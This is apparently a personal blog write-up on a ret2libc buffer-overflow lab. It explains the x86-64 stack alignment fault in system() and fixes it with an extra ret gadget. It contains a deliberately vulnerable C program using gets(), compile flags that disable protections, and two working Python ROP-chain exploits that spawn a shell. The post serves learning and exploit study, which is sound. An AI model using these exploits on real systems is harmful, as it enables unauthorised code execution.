---
title: The Stack allignment problem
date: 2025-06-10
draft: false
---


While learning about ret2libc exploitation, I encountered a stack alignment issue that initially confused me. After spending some time debugging, I finally understood why we add that extra ret instruct for the solution. I thought it would be valuable to share this insight with you all, in case it helps someone facing the same problem.

‍

**Lets look at the memory layout**

![image](/blogs/the-stack-allignment-problem/image-20250615121128-wuoskjb.png)

‍

**Our key interest Right now, is the stack!**

### Stack is a part of memory used for:

- **Function calls** (return addresses)
- **Function arguments** (sometimes if your function has more than 6 argument)
- **Local variables**
- ‍

> The first 6 arguments are on the following Registers (RDI, RSI, RDX, RCX, R8, R9), rest of the arguments will get into Stack

![image](/blogs/the-stack-allignment-problem/image-20250613132559-dtky5o7.png)

Now, you must be aware with buffer overflow and ret2libc attacks for proceeding further on this article.

‍

```mathematica
#include <stdio.h>
#include <stdlib.h>

// Vulnerable function
void vuln_func() {
    char buffer[8];  // Small buffer (8 bytes)

    puts("The buffer is small now, enter some data:");

     //gets() is unsafe and causes buffer overflows.
    gets(buffer);
}

int main() {
    puts("Calling vulnerable function...");
    vuln_func();

    return 0;
}

```

‍

```makefile
all:
	gcc -no-pie -fno-stack-protector vulnerable.c -o vulnerable  -D_FORTIFY_SOURCE=0  -std=c99 

clean:
	rm -f vulnerablee
```

This compiles your `vulnerable.c`​​ file with **exploitation-friendly settings**

‍

```mathematica
+-------------------------------------------------------------+
|                  GCC Compilation Flags                      |
+------------------------+------------------------------------+
|        Flag            |            Description             |
+------------------------+------------------------------------+
| -no-pie                | Disables PIE (Position-Independent |
|                        | Executable).                       |
|                        | Ensures fixed memory addresses in  |
|                        | the binary (e.g., main, puts).     |
+------------------------+------------------------------------+
| -fno-stack-protector   | Disables stack canary protection.  |
|                        | Allows buffer overflows without    |
|                        | detection.                         |
+------------------------+------------------------------------+
| -D_FORTIFY_SOURCE=0    | Turns off extra glibc checks for   |
|                        | functions like gets(), strcpy().   |
|                        | Prevents automatic abort on unsafe |
|                        | operations.                        |
+------------------------+------------------------------------+
| -std=c99               | Compiles using C99 standard.       |
|                        | Ensures compatibility and better   |
|                        | behavior in modern compilers.      |
+------------------------+------------------------------------+
| -z execstack (missing) | This flag is NOT included here.    |
|                        | It would allow execution on stack  |
|                        | (needed for shellcode sometimes).  |
|                        | This binary has non-executable     |
|                        | stack (default in modern Linux).   |
+------------------------+------------------------------------+

```

‍

![image](/blogs/the-stack-allignment-problem/image-20250619001922-4gid30k.png)

‍

```pgsql
 File: exploit.py

───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ import struct
   2   │ libc_base = 0x7ffff7da9000
   3   │ payload = b"A" * 8                                           # offset to rbp 
   4   │ payload += b"B" * 8                                          # rbp
   5   │ payload += struct.pack("<Q", libc_base + 0x000000000002a145) # pop rdi; ret;
   6   │ payload += struct.pack("<Q", 0x7ffff7f50ea4)                 # address of /bin/sh
   7   │ payload += struct.pack("<Q", 0x7ffff7dfc110)                 # address of System function() 
   8   │ payload += struct.pack("<Q", 0x7ffff7deb340)                 # address of exit function
   9   │ 
  10   │ #we are using option <Q>, because we want to convert these 64 bit addresses to little endian format
  11   │ 
  12   │ 
  13   │ # print(payload)
  14   │ with open("exploit1", "wb") as f:
  15   │     f.write(payload)
  16   │ 
  17   │ print("Payload written to exploit1. Run with: `./vulnerable_program < input.txt`")


```

‍

This is the exploit I wrote while performing a **ret2libc attack**. The goal is to call the `system()`​​ function with `"/bin/sh"`​​ as its argument in order to spawn a shell. To do this, we use a **ROP gadget** — specifically `pop rdi; ret`​​<span data-type="text" style="color: var(--b3-font-color10);"> </span>— which is used to load the address of the `"/bin/sh"`​​ string into the **RDI register**, as required by the x86-64 calling convention (where the first function argument is passed via RDI).

After setting up the argument, we place the address of the system() function in the chain, which will be executed next. Finally, we include the address of the exit function so that once system returns, the program exits cleanly without crashing.

‍

‍

```mathematica
pwndbg> disassemble vuln_func
```

‍

![image](/blogs/the-stack-allignment-problem/image-20250614151815-v4quv7t.png)

```mathematica
pwndbg> break *0x000000000040115b
             or
pwndbg> break *vuln_func + 37
```

‍

run the binary with the exploit we wrote above.

![image](/blogs/the-stack-allignment-problem/image-20250614152132-n21cfu0.png)

‍

We hit the Brekpoint

![image](/blogs/the-stack-allignment-problem/image-20250614150240-ualnstw.png)

‍

The stack looks perfect

```mathematica
────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdc28 —▸ 0x7ffff7dd3145 (iconv+181) ◂— pop rdi
01:0008│     0x7fffffffdc30 —▸ 0x7ffff7f50ea4 ◂— 0x68732f6e69622f /* '/bin/sh' */
02:0010│     0x7fffffffdc38 —▸ 0x7ffff7dfc110 (system) ◂— test rdi, rdi
03:0018│     0x7fffffffdc40 —▸ 0x7ffff7deb340 (exit) ◂— sub rsp, 8
```

‍

**Stack diagram**

```pgsql
               ┌────────────────────────────────────────────┐
  High addr →  │       "AAAA AAAA" (8‑byte padding)         │
               ├────────────────────────────────────────────┤
               │       "BBBB BBBB" (fake saved RBP)         │
               ├────────────────────────────────────────────┤
               │     0x7fffffffdc28 →  pop rdi ; ret (libc) │  ← first RET jumps here
               ├────────────────────────────────────────────┤
               │    0x7fffffffdc30 →  "/bin/sh" string      │  ← popped into RDI
               ├────────────────────────────────────────────┤
               │    0x7fffffffdc38 →  system()              │  ← second RET jumps here
               ├────────────────────────────────────────────┤
               │    0x7fffffffdc40 →  exit()                │  ← system() returns here
  Low  addr →  └────────────────────────────────────────────┘

```

‍

I had some glitch in pwndbg, so i have shifted to gef.

![image](/blogs/the-stack-allignment-problem/image-20250614153331-p3b5nam.png)

‍

![image](/blogs/the-stack-allignment-problem/image-20250614153614-vox7o3o.png)

‍

```pgsql
rdi: 0x00007ffff7f50ea4  →  0x0068732f6e69622f ("/bin/sh"?)
```

![image](/blogs/the-stack-allignment-problem/image-20250614153727-ga806ic.png)

‍

**Calling System Function**

![image](/blogs/the-stack-allignment-problem/image-20250614154120-15gnfac.png)

```pgsql
$rip   : 0x00007ffff7dfc110  →  <system+0000> test rdi, rdi
```

‍

‍

![image](/blogs/the-stack-allignment-problem/image-20250614154156-fbg1crx.png)

‍

**Everything was fine until we got this**

![image](/blogs/the-stack-allignment-problem/image-20250614154401-sc849tw.png)

```pgsql
 ► 0x7ffff7dfbdf4 <do_system+356>    movaps xmmword ptr [rsp + 0x50], xmm0     <[0x7fffffffd8e8] not aligned to 16 bytes>
```

‍

I saw some of the articles on internet talking about this issue, I am sharing those here for your reference:

```ascii
https://security.stackexchange.com/questions/278592/ret2libc-exploit-not-working-but-it-seems-correct-in-gdb#:~:text=There%20is%20a%20great%20chance,stack%20may%20not%20aligned%20propertly

https://c9x.me/compile/doc/abi.html#:~:text=The%20ABI%20is%20unclear%20on,0%20mod%2016

https://stackoverflow.com/questions/67243284/why-movaps-causes-segmentation-fault#:~:text=%3E%20MOVAPS%E2%80%94Move%20Aligned%20Packed%20Single,GP%29%20will%20be%20generated
```

‍

The key is that **just before calling** **​`system()`​** ​  **(i.e. at the entry to** **​`system`​**​ **) the stack pointer**  **​`%rsp`​**​ **must satisfy the AMD64 ABI’s alignment requirements**. By the AMD64 ABI, RSP must be **16-byte aligned at every** **​`call`​**​ **instruction.**

‍

**Before any** **​`call`​**​ **instruction**, `%rsp`​ **must** be a multiple of 16

> “Just before `call`​, `%rsp % 16 == 0`​​. On function entry, `%rsp % 16 == 8`​​.”

```lua
%rsp ≡ 0 mod 16   ---->  rsp % 16 = 0
```

The address of rsp should be the multiple of 16.

‍

Lets go the our Vulnerable Binary, run it again inside gdb.

![image](/blogs/the-stack-allignment-problem/image-20250619002842-wkfelpx.png)hit the breakpoint at the ret instruction.

​​

ret will take the address of  our gadget pop rdi ; ret and load it inside the rip

```mathematica
gef➤ si
```

![image](/blogs/the-stack-allignment-problem/image-20250619003923-j4iqz3d.png)

‍

![image](/blogs/the-stack-allignment-problem/image-20250619003548-lfviv2n.png)

‍

**Remember that rule?**

> “Just before `call`​, `%rsp % 16 == 0`​​. On function entry, `%rsp % 16 == 8`​​.”

![image](/blogs/the-stack-allignment-problem/image-20250619004408-4a7qs9c.png)

Just Before call, `%rsp % 16 == 0`​​ . but we are getting

```mathematica
gef➤  !python3 -c 'print(0x00007fffffffdd08 % 16)'
8

```

Now thats where the problem is.

‍

**Now we are at the entry of the system function**

> ABI expects -- On function entry, `%rsp % 16 == 8`​​.
>
> but we are getting `%rsp % 16 == 0`​​

![image](/blogs/the-stack-allignment-problem/image-20250619005243-acxi4zk.png)

‍

```mathematica
Correct Stack Alignment:
    rsp % 16 = 8       <- This is what ABI expects after 'call'
    system() works fine

Misaligned Stack:
    rsp % 16 = 0       <- Due to raw ROP chain
and you get that Movaps issue

```

‍

When you normally call a function on x86\_64, the hardware does two things under the hood:

1. ​**​`call target`​**​

    - Pushes the **return address** (8 bytes) onto the stack
    - Decrements `rsp`​ by 8 (stack grows downward)
    - Jumps to `target`​

‍

> **Inside the callee**, on entry you see `rsp % 16 == 8`​​ — exactly what the ABI expects.

‍

However, in a ROP chain you don’t use `call`​; you stitch together a series of **​`ret`​**​ instructions instead. Each `ret`​ does:

- Pop the top 8 bytes from the stack into the instruction pointer
- Increments `rsp`​ by 8 (stack “shrinks” upward)

‍

Therefore, If you build a ROP chain without caring about alignment, each gadget’s `ret`​ will keep adding +8 to `rsp`​. By the time you hit `system()`​, your `rsp`​ can be at a multiple of 16 (i.e. `rsp % 16 == 0`​), which the ABI **does not** allow on function entry. Glibc then immediately executes a `movaps`​ on the (misaligned) stack and you get a General Protection Fault.

‍

![image](/blogs/the-stack-allignment-problem/image-20250619010638-pkl4ew5.png)

‍

![image](/blogs/the-stack-allignment-problem/image-20250619011149-g8u69fa.png)

**Updated Exploit**

```mathematica
File: exploit.py
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ import struct
   2   │ libc_base = 0x7ffff7da9000
   3   │ payload = b"A" * 8                                           # offset to rbp 
   4   │ payload += b"B" * 8                                          # rbp
   5   │ payload += struct.pack("<Q", libc_base + 0x00000000000f7bb3) # ret; 
   6   │ payload += struct.pack("<Q", libc_base + 0x000000000002a145) # pop rdi; ret;
   7   │ payload += struct.pack("<Q", 0x7ffff7f50ea4)                 # address of /bin/sh
   8   │ payload += struct.pack("<Q", 0x7ffff7dfc110)                 # address of System function() 
   9   │ payload += struct.pack("<Q", 0x7ffff7deb340)                 # address of exit function
  10   │ 
  11   │ #we are using option <Q>, because we want to convert these 64 bit addresses to little endian format
  12   │ 
  13   │ 
  14   │ # print(payload)
  15   │ with open("exploit1", "wb") as f:
  16   │     f.write(payload)
  17   │ 
  18   │ print("Payload written to exploit1. Run with: `./vulnerable_program < input.txt`")

```

‍

‍

Lets verify our exploit 

![image](/blogs/the-stack-allignment-problem/image-20250619011556-78v07je.png)

![image](/blogs/the-stack-allignment-problem/image-20250619011932-m4z3440.png)

‍

![image](/blogs/the-stack-allignment-problem/image-20250619012146-bg66slu.png)

![image](/blogs/the-stack-allignment-problem/image-20250619012215-ofbgg3u.png)

So, hope you guys now have finally understood the stack allignment problem, and why use that extra ret gadget.

  
Happy hacking ;)

‍
